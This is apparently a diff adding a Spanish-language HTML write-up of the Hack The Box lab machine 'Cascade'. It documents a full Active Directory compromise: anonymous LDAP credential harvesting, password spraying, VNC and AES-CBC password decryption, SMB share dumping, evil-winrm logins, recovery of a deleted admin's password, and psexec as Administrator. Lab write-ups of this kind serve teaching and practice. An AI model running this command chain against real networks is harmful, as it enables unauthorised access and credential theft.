@@ -1,0 +1,182 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Cascade HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/active-directory.html">~/writeups/active-directory</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/cascade/pasted-image-20260302114401.png" alt="Cascade HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Active Directory</p>
+          <h1>Cascade</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>LDAP</span>
+            <span>SMB</span>
+            <span>vnc</span>
+            <span>sqlite</span>
+            <span>base64</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+          <p>10.129.14.6</p>
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: LDAP anónimo donde se encuentran credenciales</li>
+            <li><code>Movimiento lateral</code>: Share con credenciales hexadecimales de <code>VNC</code></li>
+            <li><code>Movimiento lateral</code>: Base de datos <code>SQLite</code> y código fuente de un binario para descifrar credenciales con <code>AES-CBC</code></li>
+            <li><code>Escalada de Privilegios</code>: Grupo <code>AD Recycle Bin</code></li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302122146.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Enumerar LDAP anónimo</h3>
+            <pre><code>ldapsearch -x -H ldap://cascade.local -b &#x27;DC=CASCADE,DC=LOCAL&#x27;  | grep -i &quot;pwd&quot; -C1
+
+echo &#x27;clk0bjVldmE=&#x27; | base64 -d
+# Contraseña: rY4n5eva</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302123205.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Lista usuarios</h3>
+            <pre><code>rpcclient -U &quot;&quot; 10.129.14.6 -N
+enumdomusers</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Password Spray</h3>
+            <pre><code>nxc smb 10.129.14.6 -u users -p &#x27;rY4n5eva&#x27; --continue-on-succes --no-bruteforce
+# Credenciales -&gt; r.thompson:rY4n5eva</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Share con Credenciales Hex en VNC</h2>
+          <div class="code-card">
+            <h3>Shares</h3>
+            <pre><code>nxc smb 10.129.14.6 -u users -p &#x27;rY4n5eva&#x27; --shares</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302123913.png" alt="Cascade HTB" />
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302133340.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Share Data: Hay un Log con esa frase pista y credenciales en un fichero Hexadecimal</h3>
+            <pre><code># Log: Username TempAdmin has the same password as admin 
+
+# Password Hex:6b,cf,2a,4b,6e,5a,ca,0f
+echo &quot;6bcf2a4b6e5aca0f&quot; | xxd -ps -r
+# No es legible</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302133133.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Descifrar Contraseñas Hexadecimal del Sistema VNC</h3>
+            <pre><code>echo -n 6bcf2a4b6e5aca0f | xxd -r -p | openssl enc -des-cbc --nopad --nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d -provider legacy -provider default | hexdump -Cv
+# Credenciales -&gt; s.smith:sT333ve2</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302133830.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i cascade.local -u s.smith -p sT333ve2</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302134139.png" alt="Cascade HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral:</h2>
+          <div class="code-card">
+            <h3>Dumpear share Audit$</h3>
+            <pre><code>nxc smb cascade.local -u s.smith -p sT333ve2 --shares
+smbclient  //cascade.local/Audit$ -U &#x27;s.smith%sT333ve2&#x27; -c &quot;recurse; prompt; mget *;&quot;</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302163812.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Abrir Autid.bd con SQLite</h3>
+            <pre><code>sqlitebrowser Audit.db
+# Credenciales cifradas -&gt; arksvc:BQO5l5Kj9MdErXx6Q6AGOw==
+# Intento de base64 -d fallido: Contraseña ilegible</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302164016.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Enumerar binarios con Strings</h3>
+            <pre><code>strings CascAudit.exe # UTF-8
+strings CascAudit.exe -e l # UTF-16LE (Windows)</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>Enumerar en el código fuente del binario para comprobar el método de encriptación</h3>
+            <pre><code># Herramineta Windows (DotPeek): Leer código fuente de CascAudit.exe
+# Password Key: c4scadek3y654321</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302170717.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Enumerar en el código fuente del binario para comprobar el método de encriptación</h3>
+            <pre><code># Herramineta Windows (DotPeek): Leer código fuente de CascCrypto.dll
+# Password IV: 1tdyjCbY1Ix49842
+# Método Encriptación: AES con CBC</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302170902.png" alt="Cascade HTB" />
+          <p><a href="https://gchq.GitHub.io/CyberChef/" target="_blank" rel="noreferrer">CyberChef</a></p>
+          <div class="code-card">
+            <h3>Descifrar contraseña</h3>
+            <pre><code># Contraseña base64 arksvc: BQO5l5Kj9MdErXx6Q6AGOw==
+# Password Key: c4scadek3y654321
+# Password IV: 1tdyjCbY1Ix49842
+# Método Encriptación: AES con CBC</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302171550.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Acceso WinRM</h3>
+            <pre><code>evil-winrm -i cascade.local -u arksvc -p &#x27;w3lc0meFr31nd&#x27;</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios: Grupo Recycle Bin</h2>
+          <div class="code-card">
+            <h3>Ver Grupos</h3>
+            <pre><code>whoami /groups</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302162442.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Ver objeto user (TempAdmin) eliminado</h3>
+            <pre><code>Get-ADObject -ldapfilter &quot;(&amp;(objectclass=user)(DisplayName=TempAdmin)(isDeleted=TRUE))&quot; -IncludeDeletedObjects -Properties *
+# Encontramos la contraseña en base64</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302145729.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Decodificar contraseña</h3>
+            <pre><code>echo &quot;YmFDVDNyMWFOMDBkbGVz&quot; | base64 -d
+# Contraseña: baCT3r1aN00dles</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/cascade/pasted-image-20260302145653.png" alt="Cascade HTB" />
+          <div class="code-card">
+            <h3>Acceso PS-EXEC</h3>
+            <pre><code>impacket-psexec Administrator@cascade.local</code></pre>
+          </div>
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>LDAP</span>
+            <span>SMB</span>
+            <span>vnc</span>
+            <span>sqlite</span>
+            <span>base64</span>
+            <span>leer_binario</span>
+            <span>dotpeek</span>
+            <span>fichero_bd</span>
+            <span>aes</span>
+            <span>cbc</span>
+            <span>strings</span>
+            <span>cyberchef</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
